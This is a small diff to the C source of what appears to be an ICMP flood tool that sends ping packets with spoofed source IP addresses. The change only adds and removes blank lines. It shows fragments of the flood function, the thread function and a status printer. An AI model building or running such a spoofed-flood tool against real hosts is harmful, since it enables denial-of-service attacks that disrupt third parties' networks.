@@ -16,8 +16,6 @@ int lines = 0, counter = 0, packet_num, ec = 0;
 void *icmp_flood_thread(void *);
 
 void icmp_flood(struct sockaddr_in *dest_addr, char *spoof_ip){
-
-
     char packet[4097], data[PACKT_SIZE];
     memset(packet, 0, sizeof(packet));
 
@@ -86,10 +84,12 @@ void icmp_flood(struct sockaddr_in *dest_addr, char *spoof_ip){
     counter++;
     close(sock);
 }
+
 void print_status(char *ip) {
     printf("%s[%sINFO%s]:%s Sending ICMP ping request.. using spoofed source ip %s[%s%s%s]%s (%d/%d)\n", 
     whi, gre, whi, res, whi, pur, ip, whi, res, counter, packet_num);
 }
+
 //The thread function
 void *icmp_flood_thread(void *vargb) {
     struct sockaddr_in *d_addr = (struct sockaddr_in*)vargb;
